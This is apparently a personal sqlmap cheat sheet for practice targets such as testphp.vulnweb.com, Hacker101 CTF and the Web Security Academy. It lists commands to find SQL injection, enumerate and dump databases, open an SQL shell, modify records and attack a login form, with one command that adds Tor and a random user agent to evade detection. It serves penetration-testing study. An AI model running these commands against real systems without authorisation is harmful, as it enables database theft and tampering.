

# SQLMap - Cheetsheat
https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap



## Step 1

```sh
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
```

Result
- Vulneruble parameter
    - Type
    - Title
    - Payload
- back-end DBMS 
- Web application technology



## Step 2
```sh
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```

Result
- database names

At this moment check which databases are default in this DBMS, leave them and 
dump non-default databases.

MySQL default databases
- mysql 
- information_schema
- performance_schema
- sys

sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --sql-shell


## Step 3
```sh
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D <db-name> --tables
```
Result
- tables names for <db-name>


## Step 4
```sh
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D <db-name> --dump
```

Result
- dump of <db-name>


## Update database
sqlmap -u https://b97b4ef2b348bba9ad205c30e5e971c4.ctf.hacker101.com/fetch?id=1 -D level5 --sql-query="UPDATE photos SET filename='files/purrfect.jpg' WHERE id=3;"


## Login form
sqlmap -u https://$TARGET/login --data "username=a&password=b" -p username --dump --output-dir="db-dump"



## -------------------------------------------------------------
- sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D <db-name> --cookie="security=low; PHPSESSID=13o5hlkjs3hur2pvnfkgim9t74" --dump-all --batch --output-dir="db-dump" --random-agent --risk=3 --level=5 --tor


sqlmap -u "https://0aa1002c0316fe558188572400c800e6.web-security-academy.net/filter?category=Tech+gifts" --dbs public --sql-query "select * from users"
Upload File
